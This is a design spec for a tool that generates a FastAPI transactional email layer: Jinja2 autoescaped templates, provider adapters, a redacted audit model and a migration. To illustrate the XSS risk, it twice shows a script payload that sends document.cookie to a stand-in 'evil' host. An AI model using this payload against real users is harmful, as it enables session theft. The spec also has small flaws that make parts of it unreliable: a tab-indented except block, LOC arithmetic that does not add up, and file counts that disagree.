# TOOL-055: add_email_templates

> **Status**: SPEC v2 (rigorous)
> **Last updated**: 2026-04-15

---

## 1. Overview

| Metric | Value |
|--------|-------|
| Tool name | `fastapi_add_email_templates` |
| Category | EXTEND > Infrastructure |
| Complexity | High |
| Source | `adapt/extend/infrastructure/add_email_templates.py` (1938 LOC) |
| Tests | `adapt/extend/infrastructure/test_add_email_templates.py` (21 tests) |
| Dependencies | FastAPI, SQLAlchemy 2.0 async, Alembic, Jinja2 ≥3.1, pydantic v2 |
| Optional SDKs (lazy) | `resend`, `postmarker` — NOT added to `requirements.txt` |
| Signature | `add_email_templates(inp: ToolInput, *, provider: str = "resend", from_address: str = "noreply@example.com", from_name: str = "Your App", reply_to: str \| None = None, default_locale: str = "en") -> ToolResult` |
| Parameters | `inp.project_dir`: Absolute path to FastAPI project<br>`inp.dry_run`: Preview without writing<br>`provider`: Default provider (`resend` \| `postmark` \| `smtp`)<br>`from_address`: Default `From:` email address<br>`from_name`: Default `From:` display name<br>`reply_to`: Optional `Reply-To:` (stored as `""` when `None`)<br>`default_locale`: Default locale for template lookup (`"en"`) |

## 2. Purpose

Transactional email is the single most common place where new FastAPI projects ship real, exploitable XSS bugs into production. The common "just send the email" path — `smtplib.send(f"<h1>Hi {user.name}</h1>")` — is five lines of code, zero templates, zero escaping, and a direct injection oracle the moment any attacker-controlled value reaches the body. A display name of `<script>fetch('https://evil/' + document.cookie)</script>` lands straight into the victim's inbox and — on many webmail clients — executes the moment the message is opened. Beyond XSS, the ad-hoc approach produces every other deliverability and auditability anti-pattern at once: no plaintext fallback (spam filters and text-mode clients punish you), no `Reply-To` handling, no provider abstraction (every call site hardcodes SMTP), no locale support, no audit trail of what was actually sent, PII (raw recipient addresses) splattered across application logs, and provider SDK imports at the module top so the app refuses to boot when the SDK is not installed.

The `fastapi_add_email_templates` tool generates an entire production-grade transactional email layer in a single invocation. It creates a Jinja2-powered renderer with `autoescape=True` bound to the HTML extension (so XSS through context interpolation is impossible by construction), a template registry (`TemplateName` enum + `TEMPLATE_REQUIRED_CONTEXT` + `TEMPLATE_EXAMPLE_CONTEXT`) that is the single source of truth for what context each template needs and what a "realistic" preview looks like, 12 built-in template files (**4 templates × 3 variants each**: `.subject.txt`, `.html`, `.txt`), a pluggable provider layer with three adapters (Resend, Postmark, SMTP) that all lazy-import their SDK inside `send()` so the app boots cleanly without any SDK installed, an `EmailDelivery` SQLAlchemy audit model (optionally tenant-aware when `app/models/tenant.py` exists) whose `to_email_redacted` column stores the recipient as `u***@example.com` so a DB dump cannot leak PII, async CRUD helpers with idempotent `pending → sent → failed` transitions, HTTP routes for dev-mode preview (`GET /email/preview/{template_name}`, gated on `settings.ENVIRONMENT != "production"`) and per-user delivery listing (`GET /email/deliveries/me`), an Alembic migration that chains onto the current head, and every required settings field (`EMAIL_PROVIDER`, `EMAIL_FROM`, `EMAIL_FROM_NAME`, `EMAIL_REPLY_TO`, `EMAIL_DEFAULT_LOCALE`, `RESEND_API_KEY`, `POSTMARK_API_KEY`, `SMTP_*`, `EMAIL_PREVIEW_ENABLED_IN_PROD`).

Three design decisions are load-bearing and inviolable: **(1) Jinja2 `autoescape=True`** — the renderer builds its `Environment` with `select_autoescape(["html"])`, so every `{{ variable }}` interpolation into an HTML template is HTML-escaped automatically. The only way to emit raw HTML is the explicit `{{ value | safe }}` filter, which never appears in the built-in templates. **(2) Lazy SDK imports** — `import resend` and `from postmarker.core import PostmarkClient` live inside each adapter's `async def send()` method, not at module top, so the application boots cleanly when the SDK is missing and `requirements.txt` does not include the optional provider packages at all. **(3) `send_email` ≤ 50 LOC** — to keep the critical send path auditable under one screen, the message-assembly logic was extracted into a `_build_message(rendered, to)` helper. Together with the template registry, which lets new email types be added by appending a single row to `TEMPLATE_REQUIRED_CONTEXT` and dropping three files into `templates/en/`, the whole layer stays small, typed, idempotent, and safe by construction.

## 3. Performance SLOs

| Metric | Target | Why |
|--------|--------|-----|
| Tool execution time | < 3s | Pure file writes, zero network/IO blocking |
| Files created | ≥ 21 | Complete layer requires multiple modules + 12 templates |
| Files modified | ≥ 2 | At minimum `config.py` + `models/__init__.py` |
| Max function LOC (generated) | ≤ 50 | Enforced by `test_no_function_over_50_loc` |
| Render latency (warm env) | < 3 ms | FileSystemLoader + cached templates |
| Send latency (Resend HTTP API) | < 400 ms P95 | Provider SLA; not blocking request thread |
| Send latency (SMTP STARTTLS) | < 1.5 s P95 | Runs in `asyncio.to_thread`, never blocks event loop |
| Audit row write | < 10 ms | Single SQLAlchemy `INSERT` + `flush()` |
| Recipient redaction overhead | < 50 µs | Pure Python string slice |
| Migration runtime | < 1 s | Single `CREATE TABLE` + 4 indexes |
| Preview endpoint latency (dev) | < 30 ms | Render + HTTPResponse wrap |
| Idempotent re-run | < 200 ms | Detects `TemplateName` fingerprint and returns `no_op` |

---

## 4. Code Examples (Before / After)

### 4.1 Ad-hoc send: BEFORE (vulnerable)
```python
# app/api/routes/auth.py — the pattern this tool eliminates
import smtplib
from email.message import EmailMessage

@router.post("/signup")
async def signup(data: SignupIn) -> dict:
    user = await create_user(data)
    mime = EmailMessage()
    mime["From"] = "noreply@example.com"
    mime["To"] = user.email
    mime["Subject"] = "Welcome!"
    mime.set_content(
        # XSS: user.display_name is attacker-controlled and reaches HTML verbatim
        f"<h1>Welcome {user.display_name}</h1>"
        f"<a href='https://example.com/activate?token={user.activation_token}'>Activate</a>",
        subtype="html",
    )
    with smtplib.SMTP("localhost", 587) as s:
        s.send_message(mime)
    return {"ok": True}
```

Problems:

1. **XSS**: `user.display_name = "<script>fetch('//evil/'+document.cookie)</script>"` executes in webmail.
2. **No plaintext fallback** → spam filters penalize, text-mode clients show nothing.
3. **SMTP hardcoded** → swapping to Resend = rewrite every call site.
4. **Raw recipient logged** → GDPR violation on any uncaught exception.
5. **No audit trail** → operators cannot troubleshoot bounces.
6. **Blocking I/O on event loop** → `smtplib.SMTP.send_message` is sync.
7. **Token interpolated via f-string** → URL-smuggling surface.

### 4.2 Template Registry: AFTER
```python
# app/email/registry.py (generated verbatim)
from __future__ import annotations
from enum import Enum


class TemplateName(str, Enum):
    """Built-in transactional template identifiers.

    Values are the on-disk filename stems (without extension).
    The renderer expects three sibling files per template under
    ``app/email/templates/{locale}/``:

        * ``{name}.subject.txt`` — plaintext subject line
        * ``{name}.html``       — HTML body (inline CSS)
        * ``{name}.txt``        — plaintext body
    """

    WELCOME = "welcome"
    PASSWORD_RESET = "password_reset"
    EMAIL_VERIFICATION = "email_verification"
    RECEIPT = "receipt"


# Required context keys for each template.  Missing keys raise
# MissingContextError before Jinja2 gets a chance to emit a
# silent-empty-string.
TEMPLATE_REQUIRED_CONTEXT: dict[TemplateName, tuple[str, ...]] = {
    TemplateName.WELCOME: ("user_name", "activation_url"),
    TemplateName.PASSWORD_RESET: ("user_name", "reset_url", "expires_in_hours"),
    TemplateName.EMAIL_VERIFICATION: ("user_name", "verification_url"),
    TemplateName.RECEIPT: (
        "user_name",
        "amount_formatted",
        "item_name",
        "receipt_url",
    ),
}


# Example context used by the dev preview endpoint so designers can
# iterate on templates without constructing a payload by hand.
TEMPLATE_EXAMPLE_CONTEXT: dict[TemplateName, dict[str, str]] = {
    TemplateName.WELCOME: {
        "app_name": "Your App",
        "user_name": "Alice",
        "activation_url": "https://example.com/activate?token=demo",
    },
    TemplateName.PASSWORD_RESET: {
        "app_name": "Your App",
        "user_name": "Alice",
        "reset_url": "https://example.com/reset?token=demo",
        "expires_in_hours": "2",
    },
    TemplateName.EMAIL_VERIFICATION: {
        "app_name": "Your App",
        "user_name": "Alice",
        "verification_url": "https://example.com/verify?token=demo",
    },
    TemplateName.RECEIPT: {
        "app_name": "Your App",
        "user_name": "Alice",
        "amount_formatted": "$49.00",
        "item_name": "Pro Plan (monthly)",
        "receipt_url": "https://example.com/receipts/demo",
    },
}


class MissingContextError(ValueError):
    """Raised when a template is rendered with missing required keys."""
```

Why a registry? Adding a new template means **append one row + drop three files**. No core module change. No route change. No provider change. Template bugs surface at the `render_email` call site with an explicit `MissingContextError("template 'welcome' missing required context keys: activation_url")` — never deep inside Jinja2 as a silent empty-string expansion.

### 4.3 Jinja2 Environment with `autoescape=True` (INV-EMAIL-01)
```python
# app/email/render.py (generated verbatim, critical lines highlighted)
from dataclasses import dataclass
from pathlib import Path
from typing import Any

from jinja2 import Environment, FileSystemLoader, TemplateNotFound, select_autoescape

from app.email.registry import (
    TEMPLATE_REQUIRED_CONTEXT,
    MissingContextError,
    TemplateName,
)


TEMPLATES_ROOT = Path(__file__).resolve().parent / "templates"


@dataclass(frozen=True)
class RenderedEmail:
    """A fully-rendered email message ready for a provider adapter."""

    subject: str
    html: str
    text: str


def _build_env(locale: str) -> Environment:
    """Build a Jinja2 environment rooted at a specific locale directory.

    Args:
        locale: Locale subdirectory name (e.g. ``"en"``).

    Returns:
        A Jinja2 ``Environment`` with autoescape enabled for HTML.
    """
    loader = FileSystemLoader(str(TEMPLATES_ROOT / locale))
    return Environment(
        loader=loader,
        autoescape=select_autoescape(["html"]),   # <<< INV-EMAIL-01
        keep_trailing_newline=True,
    )


def _resolve_locale(name: TemplateName, requested: str) -> str:
    """Return a locale that has the given template, with fallback chain.

    Order: requested → ``"en"`` → first available directory that
    has ``{name}.html``.
    """
    for candidate in (requested, "en"):
        if (TEMPLATES_ROOT / candidate / f"{name.value}.html").exists():
            return candidate
    if TEMPLATES_ROOT.exists():
        for entry in sorted(TEMPLATES_ROOT.iterdir()):
            if entry.is_dir() and (entry / f"{name.value}.html").exists():
                return entry.name
    raise TemplateNotFound(f"{name.value}.html")


def _validate_context(name: TemplateName, context: dict[str, Any]) -> None:
    """Ensure all required context keys are present."""
    required = TEMPLATE_REQUIRED_CONTEXT.get(name, ())
    missing = [k for k in required if k not in context]
    if missing:
        raise MissingContextError(
            f"template {name.value!r} missing required context keys: "
            + ", ".join(missing)
        )


def render_email(
    name: TemplateName,
    context: dict[str, Any],
    locale: str = "en",
) -> RenderedEmail:
    """Render a template triple into a ``RenderedEmail``.

    Raises:
        MissingContextError: If required context keys are missing.
        TemplateNotFound: If no locale has the template.
    """
    _validate_context(name, context)
    resolved = _resolve_locale(name, locale)
    env = _build_env(resolved)
    subject = env.get_template(f"{name.value}.subject.txt").render(**context).strip()
    html = env.get_template(f"{name.value}.html").render(**context)
    text = env.get_template(f"{name.value}.txt").render(**context)
    return RenderedEmail(subject=subject, html=html, text=text)
```

**Why `select_autoescape(["html"])`** — it binds autoescape to the filename extension, so the renderer escapes `{{ }}` interpolations inside `.html` templates but leaves `.txt` (plaintext) and `.subject.txt` (subject) untouched. A payload like `"<script>alert(1)</script>"` flowing as `user_name` lands in the HTML as `&lt;script&gt;alert(1)&lt;/script&gt;` and in the plaintext body verbatim — which is correct, because plaintext has no HTML execution context.

### 4.4 `send_email` dispatcher — ≤ 50 LOC via `_build_message` extraction (INV-EMAIL-02)
```python
# app/email/service.py (generated verbatim)
import logging
from typing import Any

from sqlalchemy.ext.asyncio import AsyncSession

from app.core.config import settings
from app.crud.email_delivery import (
    mark_delivery_failed,
    mark_delivery_sent,
    record_delivery,
)
from app.email.providers import get_provider
from app.email.registry import TemplateName
from app.email.render import render_email
from app.schemas.email import EmailMessage

logger = logging.getLogger(__name__)


def _redact_email(email: str) -> str:
    """Return a PII-safe rendering of an email address.

    Examples:
        ``alice@example.com`` → ``a***@example.com``
        ``bob@acme.co``       → ``b***@acme.co``
    """
    if "@" not in email:
        return "***"
    local, _, domain = email.partition("@")
    first = local[:1] or "u"
    return f"{first}***@{domain}"


def _build_message(rendered: Any, to: str) -> EmailMessage:
    """Assemble an ``EmailMessage`` from rendered content + settings."""
    return EmailMessage(
        to=to,
        from_=settings.EMAIL_FROM,
        from_name=settings.EMAIL_FROM_NAME,
        subject=rendered.subject,
        html=rendered.html,
        text=rendered.text,
        reply_to=settings.EMAIL_REPLY_TO or None,
    )


async def send_email(
    session: AsyncSession,
    *,
    to: str,
    template: TemplateName,
    context: dict[str, Any],
    locale: str | None = None,
    user_id: Any | None = None,
) -> Any:
    """Render + send an email synchronously, persisting an audit row.

    Raises:
        Exception: Whatever the provider raises — after the audit row
            is marked failed.
    """
    effective_locale = locale or settings.EMAIL_DEFAULT_LOCALE
    rendered = render_email(template, context, effective_locale)
    redacted = _redact_email(to)
    delivery = await record_delivery(
        session,
        to_email_redacted=redacted,
        template_name=template.value,
        locale=effective_locale,
        provider=settings.EMAIL_PROVIDER,
        user_id=user_id,
    )
    message = _build_message(rendered, to)
    try:
        result = await get_provider().send(message)
    except Exception as exc:  # noqa: BLE001 — provider may raise anything
    	logger.warning("email send failed for %s", redacted)
    	await mark_delivery_failed(session, delivery.id, str(exc)[:500])
    	raise
    await mark_delivery_sent(session, delivery.id, result.id)
    return delivery
```

**Why ≤ 50 LOC matters** — the send path is the audit-critical surface. Operators must be able to read the entire dispatch flow without scrolling. The original prototype was 72 LOC because message assembly was inlined; extracting `_build_message()` shaved 15 LOC and pushed `send_email` to 44 LOC. The test `test_no_function_over_50_loc` AST-walks every generated function in `app/` and fails the whole run if any exceeds 50 LOC — an enforceable invariant, not a code-review convention.

### 4.5 Provider selector + Resend adapter (lazy import)
```python
# app/email/providers/__init__.py
from app.core.config import settings
from app.email.providers.base import EmailProvider
from app.email.providers.postmark import PostmarkProvider
from app.email.providers.resend import ResendProvider
from app.email.providers.smtp import SMTPProvider


def get_provider() -> EmailProvider:
    """Return the provider adapter matching ``settings.EMAIL_PROVIDER``.

    Raises:
        ValueError: If ``settings.EMAIL_PROVIDER`` is unknown.
    """
    name = (settings.EMAIL_PROVIDER or "resend").lower()
    if name == "resend":
        return ResendProvider()
    if name == "postmark":
        return PostmarkProvider()
    if name == "smtp":
        return SMTPProvider()
    raise ValueError(
        f"unknown EMAIL_PROVIDER {name!r}; expected resend|postmark|smtp"
    )
```

```python
# app/email/providers/resend.py (generated verbatim)
import logging

from app.core.config import settings
from app.schemas.email import EmailMessage, EmailResult

logger = logging.getLogger(__name__)


class ResendProvider:
    """Resend HTTP API adapter.

    Imports the ``resend`` package lazily so the app boots without
    it.  Uses ``resend.Emails.send`` which wraps the POST /emails
    endpoint.  The API key is read on every call from settings and
    NEVER logged.
    """

    async def send(self, message: EmailMessage) -> EmailResult:
        """Send *message* via Resend."""
        import resend  # <<< LAZY: app boots without resend installed

        resend.api_key = settings.RESEND_API_KEY
        payload = {
            "from": (
                f"{message.from_name} <{message.from_}>"
                if message.from_name
                else message.from_
            ),
            "to": [message.to],
            "subject": message.subject,
            "html": message.html,
            "text": message.text,
        }
        if message.reply_to:
            payload["reply_to"] = message.reply_to
        response = resend.Emails.send(payload)
        msg_id = (
            response.get("id") if isinstance(response, dict)
            else getattr(response, "id", "")
        ) or ""
        return EmailResult(id=str(msg_id), provider="resend")
```

**Why lazy** — if `import resend` lived at module top, a project using Postmark would still need the `resend` pip package or `app/email/providers/__init__.py` would crash at import time. Lazy imports mean `pip install resend` is **only** required by operators who actually chose Resend, and `requirements.txt` lists only `jinja2>=3.1.0` (no provider SDK).

### 4.6 Audit model with REDACTED recipient
```python
# app/models/email_delivery.py (abridged, tenant placeholder shown)
import uuid
from datetime import datetime

from sqlalchemy import (
    CheckConstraint, DateTime, ForeignKey, Index, String, Uuid, func,
)
from sqlalchemy.orm import Mapped, mapped_column

from app.models.base import Base


class EmailDelivery(Base):
    """An email send attempt — one row per provider call."""

    __tablename__ = "email_deliveries"

    id: Mapped[uuid.UUID] = mapped_column(
        Uuid, primary_key=True, default=uuid.uuid4,
    )
    to_email_redacted: Mapped[str] = mapped_column(String(255), nullable=False)
    template_name: Mapped[str] = mapped_column(String(64), nullable=False, index=True)
    locale: Mapped[str] = mapped_column(String(8), nullable=False)
    provider: Mapped[str] = mapped_column(String(32), nullable=False)
    provider_message_id: Mapped[str | None] = mapped_column(String(255), nullable=True)
    status: Mapped[str] = mapped_column(
        String(32), nullable=False, server_default="pending",
    )
    error: Mapped[str | None] = mapped_column(String(500), nullable=True)
    user_id: Mapped[uuid.UUID | None] = mapped_column(
        Uuid, ForeignKey("users.id", ondelete="SET NULL"), nullable=True, index=True,
    )
    # tenant_id column injected when app/models/tenant.py exists
    created_at: Mapped[datetime] = mapped_column(
        DateTime(timezone=True), server_default=func.now(), nullable=False,
    )
    sent_at: Mapped[datetime | None] = mapped_column(
        DateTime(timezone=True), nullable=True,
    )

    __table_args__ = (
        CheckConstraint(
            "status IN ('pending','sent','delivered','bounced','failed')",
            name="ck_email_deliveries_status",
        ),
        Index("ix_email_deliveries_status_created", "status", "created_at"),
        Index("ix_email_deliveries_user_created", "user_id", "created_at"),
    )
```

Note: the column is named `to_email_redacted`, not `to_email`. The only way to write a row is through `record_delivery(to_email_redacted=_redact_email(to), …)` — there is no code path that can persist a raw address.

### 4.7 Preview route (dev-only, guarded)
```python
# app/api/routes/email.py (abridged)
from fastapi import APIRouter, HTTPException, Query, status
from fastapi.responses import HTMLResponse

from app.core.config import settings
from app.email.registry import TEMPLATE_EXAMPLE_CONTEXT, TemplateName
from app.email.render import render_email

router = APIRouter(prefix="/email", tags=["email"])


def _preview_guard() -> None:
    """Raise 403 if preview is disabled in the current environment."""
    env = (getattr(settings, "ENVIRONMENT", "") or "").lower()
    if env == "production" and not getattr(
        settings, "EMAIL_PREVIEW_ENABLED_IN_PROD", False
    ):
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="email preview is disabled in production",
        )


def _resolve_template(name: str) -> TemplateName:
    try:
        return TemplateName(name)
    except ValueError as exc:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=f"unknown template {name!r}",
        ) from exc


@router.get("/preview/{template_name}", response_class=HTMLResponse)
async def preview_template(
    template_name: str,
    locale: str = Query(default="en"),
) -> HTMLResponse:
    """Return the rendered HTML body of a template for dev preview."""
    _preview_guard()
    template = _resolve_template(template_name)
    context = dict(TEMPLATE_EXAMPLE_CONTEXT.get(template, {}))
    rendered = render_email(template, context, locale=locale)
    return HTMLResponse(content=rendered.html)
```

### 4.8 The 12 template files enumerated
The tool writes exactly **4 templates × 3 variants = 12 files** under `app/email/templates/en/`:

| # | Template | Variant | Path |
|---|----------|---------|------|
| 1 | welcome | subject | `app/email/templates/en/welcome.subject.txt` |
| 2 | welcome | html | `app/email/templates/en/welcome.html` |
| 3 | welcome | plaintext | `app/email/templates/en/welcome.txt` |
| 4 | password_reset | subject | `app/email/templates/en/password_reset.subject.txt` |
| 5 | password_reset | html | `app/email/templates/en/password_reset.html` |
| 6 | password_reset | plaintext | `app/email/templates/en/password_reset.txt` |
| 7 | email_verification | subject | `app/email/templates/en/email_verification.subject.txt` |
| 8 | email_verification | html | `app/email/templates/en/email_verification.html` |
| 9 | email_verification | plaintext | `app/email/templates/en/email_verification.txt` |
| 10 | receipt | subject | `app/email/templates/en/receipt.subject.txt` |
| 11 | receipt | html | `app/email/templates/en/receipt.html` |
| 12 | receipt | plaintext | `app/email/templates/en/receipt.txt` |

Every HTML template uses inline CSS (Gmail/Outlook strip `<style>` blocks) and every plaintext variant is a usable fallback for text-only clients and spam filters.

### 4.9 Alembic migration (chained onto current head)
```python
# alembic/versions/add_email_templates.py (generated)
import sqlalchemy as sa
from alembic import op

revision = "add_email_templates"
down_revision = "DOWN_REV"   # resolved by find_migration_head()
branch_labels = None
depends_on = None


def _email_delivery_columns() -> list:
    return [
        sa.Column("id", sa.Uuid(), primary_key=True),
        sa.Column("to_email_redacted", sa.String(255), nullable=False),
        sa.Column("template_name", sa.String(64), nullable=False),
        sa.Column("locale", sa.String(8), nullable=False),
        sa.Column("provider", sa.String(32), nullable=False),
        sa.Column("provider_message_id", sa.String(255), nullable=True),
        sa.Column("status", sa.String(32),
                  server_default="pending", nullable=False),
        sa.Column("error", sa.String(500), nullable=True),
        sa.Column("user_id", sa.Uuid(),
                  sa.ForeignKey("users.id", ondelete="SET NULL"),
                  nullable=True),
        # tenant_id injected when tenants exist
        sa.Column("created_at", sa.DateTime(timezone=True),
                  server_default=sa.func.now(), nullable=False),
        sa.Column("sent_at", sa.DateTime(timezone=True), nullable=True),
        sa.CheckConstraint(
            "status IN ('pending','sent','delivered','bounced','failed')",
            name="ck_email_deliveries_status",
        ),
    ]


def _create_email_delivery_indexes() -> None:
    op.create_index(
        "ix_email_deliveries_template_name",
        "email_deliveries", ["template_name"],
    )
    op.create_index(
        "ix_email_deliveries_user_id",
        "email_deliveries", ["user_id"],
    )
    op.create_index(
        "ix_email_deliveries_status_created",
        "email_deliveries", ["status", sa.text("created_at DESC")],
    )
    op.create_index(
        "ix_email_deliveries_user_created",
        "email_deliveries", ["user_id", sa.text("created_at DESC")],
    )


def upgrade() -> None:
    op.create_table("email_deliveries", *_email_delivery_columns())
    _create_email_delivery_indexes()


def downgrade() -> None:
    op.drop_index("ix_email_deliveries_user_created", table_name="email_deliveries")
    op.drop_index("ix_email_deliveries_status_created", table_name="email_deliveries")
    op.drop_index("ix_email_deliveries_user_id", table_name="email_deliveries")
    op.drop_index("ix_email_deliveries_template_name", table_name="email_deliveries")
    op.drop_table("email_deliveries")
```

---

## 5. Quality Standards

| # | Standard | Enforcement |
|---|----------|-------------|
| QS-1 | **Jinja2 `autoescape=True` MUST be enabled for HTML templates** | `_build_env` calls `Environment(autoescape=select_autoescape(["html"]))` — enforced by `test_jinja_autoescape` |
| QS-2 | **No generated function may exceed 50 LOC** | AST walk of `app/` in `test_no_function_over_50_loc`; fails the whole run if any function body > 50 lines |
| QS-3 | **Provider SDKs are NEVER imported at module top** | `resend`, `postmarker` imports live inside `async def send()` method bodies |
| QS-4 | **Provider SDKs are NEVER written to `requirements.txt`** | `_patch_requirements` only appends `jinja2>=3.1.0`; tool comments explicitly forbid adding SDK packages |
| QS-5 | **Recipient addresses are NEVER stored or logged raw** | `_redact_email` returns `u***@domain` and is the only path to `to_email_redacted`; `logger.warning` uses the redacted form |
| QS-6 | **Every generated `.py` file MUST AST-parse cleanly** | `_assert_parses` runs `ast.parse` on every created file before returning; `test_all_py_parse` double-checks |
| QS-7 | **Tool MUST be idempotent** | Second run detects `TemplateName` fingerprint in `app/email/__init__.py`, returns `status="no_op"` with empty `files_created` / `files_modified` |
| QS-8 | **`dry_run=True` MUST write zero files** | `test_dry_run` snapshots filesystem before/after; bytewise equality required |
| QS-9 | **Template registry MUST validate context before Jinja2** | `_validate_context` raises `MissingContextError` with explicit missing-keys list — template bugs surface at call site |
| QS-10 | **Locale fallback MUST be `requested → "en" → first-available`** | `_resolve_locale` implements exactly this chain; raises `TemplateNotFound` only when no locale has the template |
| QS-11 | **Preview endpoint MUST return 403 in production** | `_preview_guard` checks `settings.ENVIRONMENT == "production"` AND `not EMAIL_PREVIEW_ENABLED_IN_PROD` |
| QS-12 | **Audit rows transition idempotently** | `mark_delivery_sent` and `mark_delivery_failed` early-return if already in target state |
| QS-13 | **Every EMAIL_* setting defaults to a safe value** | `_patch_config` writes `RESEND_API_KEY: str = ""`, `EMAIL_PREVIEW_ENABLED_IN_PROD: bool = False`, etc. |
| QS-14 | **Migration chains onto current head** | `find_migration_head(versions_dir)` resolves `down_revision` at generation time |
| QS-15 | **Tool execution time < 3s on reference hardware** | `_elapsed_ms` instrumentation; `test_execution_time_recorded` asserts positive integer |
| QS-16 | **Tool is tenant-aware when multi-tenancy is present** | `has_tenants = (app_dir / "models" / "tenant.py").exists()` drives `TENANT_PLACEHOLDER` substitution in model + migration |

## 6. Completeness Criteria

| ID | Criterion | Verification | Test |
|----|-----------|--------------|------|
| CC-01 | Tool returns `status="success"` on a fresh project | Inspect `result.status` | `test_success_status` |
| CC-02 | Second run returns `status="no_op"` without touching files | Inspect `result.status`, `files_created`, `files_modified` | `test_idempotent` |
| CC-03 | `dry_run=True` writes zero files and returns success | Byte-exact before/after snapshot | `test_dry_run` |
| CC-04 | Tool creates at least 15 new files (email pkg + 12 templates + model + schemas + crud + routes + migration) | `len(result.files_created) >= 15` | `test_files_created_count` |
| CC-05 | Tool modifies at least 2 existing files (`config.py`, `models/__init__.py`) | `len(result.files_modified) >= 2` | `test_files_modified_count` |
| CC-06 | Every generated `.py` file AST-parses cleanly | `ast.parse` over `rglob("*.py")` | `test_all_py_parse` |
| CC-07 | No generated function in `app/` exceeds 50 LOC | AST walk over `ast.FunctionDef` / `ast.AsyncFunctionDef` | `test_no_function_over_50_loc` |
| CC-08 | `EMAIL_PROVIDER`, `EMAIL_FROM`, `EMAIL_FROM_NAME`, `EMAIL_DEFAULT_LOCALE` exist inside `Settings` class body with 4-space indent | String grep + indent check | `test_config_fields_patched` |
| CC-09 | `EmailDelivery` is registered in `app/models/__init__.py` | String grep | `test_models_init_patched` |
| CC-10 | Email router is registered in `app/routes/__init__.py` | Case-insensitive `"email"` grep | `test_routes_registered` |
| CC-11 | 12 template files exist under `app/email/templates/en/` (4 templates × 3 variants) | `iterdir()` count + per-file existence | `test_template_files_exist` |
| CC-12 | `app/email/render.py` exports `render_email` producing subject/html/text | File existence + string grep | `test_render_email` |
| CC-13 | `app/email/registry.py` defines `MissingContextError` and `TEMPLATE_REQUIRED_CONTEXT` | File content grep | `test_render_missing_context_raises` |
| CC-14 | `app/email/render.py` implements locale fallback to `"en"` | String grep for `"en"` + `"locale"` | `test_locale_fallback` |
| CC-15 | `app/email/providers/__init__.py` exports `get_provider` | File content grep | `test_providers_importable` |
| CC-16 | `app/models/email_delivery.py` defines `EmailDelivery` with a redacted recipient column | File content grep (`to_email_redacted` or `redact`) | `test_email_delivery_model` |
| CC-17 | `app/api/routes/email.py` defines `/email/preview/{template_name}` route | File content grep (`preview`, `template_name`) | `test_preview_route_exists` |
| CC-18 | Jinja2 `Environment` uses `autoescape` | String grep for `autoescape` in `render.py` | `test_jinja_autoescape` |
| CC-19 | `result.execution_time_ms` is a positive integer | `> 0` assertion | `test_execution_time_recorded` |
| CC-20 | After two runs the project still fully AST-parses | `ast.parse` over every `.py` file | `test_idempotent_project_still_parses` |
| CC-21 | `result.next_steps` mentions alembic migration | Case-insensitive join + grep | `test_next_steps_present` |

## 7. Definition of Done (DoD)

- [ ] All 21 Completeness Criteria verified by the matching test
- [ ] `test_add_email_templates.py` passes all 21 tests under `pytest -v`
- [ ] Tool execution time < 3 s on reference hardware
- [ ] `ast.parse` succeeds on every generated `.py` file
- [ ] No generated function exceeds 50 LOC (AST walk)
- [ ] Second run is a true no-op (zero files touched)
- [ ] `dry_run=True` leaves the filesystem byte-identical
- [ ] `EMAIL_PROVIDER`, `EMAIL_FROM`, `EMAIL_FROM_NAME`, `EMAIL_DEFAULT_LOCALE`, `EMAIL_PREVIEW_ENABLED_IN_PROD`, `RESEND_API_KEY`, `POSTMARK_API_KEY`, `SMTP_*` all present in `Settings`
- [ ] Exactly 12 template files exist under `app/email/templates/en/`
- [ ] `EmailDelivery` registered in `app/models/__init__.py`
- [ ] Email router registered in `app/routes/__init__.py`
- [ ] Alembic migration `add_email_templates` chains onto the current head
- [ ] `jinja2>=3.1.0` in `requirements.txt`; no `resend`/`postmarker` in `requirements.txt`
- [ ] Tool is tenant-aware when `app/models/tenant.py` exists
- [ ] `send_email` body ≤ 50 LOC (measured via AST)
- [ ] `_build_message` helper exists and is called from `send_email`
- [ ] `_redact_email` is the only code path writing `to_email_redacted`

## 8. Invariants

| ID | Invariant | Enforcement | Test |
|----|-----------|-------------|------|
| INV-EMAIL-01 | **Jinja2 `autoescape` MUST be `True` for HTML templates** | `_build_env` passes `autoescape=select_autoescape(["html"])` to `Environment` — the ONLY way to emit raw HTML is the explicit `\|safe` filter, which never appears in built-in templates | `test_jinja_autoescape` |
| INV-EMAIL-02 | **`send_email` body MUST be ≤ 50 LOC** | Message assembly extracted into `_build_message(rendered, to)` helper so `send_email` reads as: validate → render → record_delivery → build → provider.send → mark_sent. AST walk fails build if LOC > 50 | `test_no_function_over_50_loc` |
| INV-EMAIL-03 | **Provider SDKs (`resend`, `postmarker`) MUST be imported lazily** | `import resend` and `from postmarker.core import PostmarkClient` live inside `async def send()` method bodies — the application boots cleanly without either SDK installed | Manual audit (`grep -n 'import resend' app/email/providers/resend.py`) + CC-15 |
| INV-EMAIL-04 | **Recipient addresses MUST be redacted before persistence OR logging** | `_redact_email` returns `u***@domain`; `record_delivery` takes `to_email_redacted` as keyword; `logger.warning` uses the redacted value | CC-16 + audit |
| INV-EMAIL-05 | **Tool MUST be idempotent** — second run is a strict no-op | Fingerprint check: `"TemplateName" in (app/email/__init__.py).read_text()` short-circuits to `status="no_op"` | `test_idempotent`, `test_idempotent_project_still_parses` |
| INV-EMAIL-06 | **`dry_run=True` MUST write zero bytes** | Early return with empty `files_created`/`files_modified` before any writer runs | `test_dry_run` |
| INV-EMAIL-07 | **Preview endpoint MUST return 403 in production** | `_preview_guard` raises `HTTPException(403)` when `settings.ENVIRONMENT == "production"` AND `not settings.EMAIL_PREVIEW_ENABLED_IN_PROD` | CC-17 + manual |
| INV-EMAIL-08 | **Template context MUST be validated before Jinja2 render** | `_validate_context` raises `MissingContextError` with explicit missing-keys list — surfaces at call site, not as silent empty string | CC-13 |
| INV-EMAIL-09 | **Locale fallback MUST be `requested → "en" → first-available`** | `_resolve_locale` hardcodes the exact chain; returns first directory containing `{name}.html` | CC-14 |
| INV-EMAIL-10 | **Alembic migration MUST chain onto the current head** | `find_migration_head(versions_dir)` substituted into `down_revision` | Manual via generated file |
| INV-EMAIL-11 | **Tool MUST NOT add provider SDK packages to `requirements.txt`** | `_patch_requirements` only adds `jinja2>=3.1.0`; tool docstring explicitly forbids adding `resend`/`postmark` | QS-4 audit |
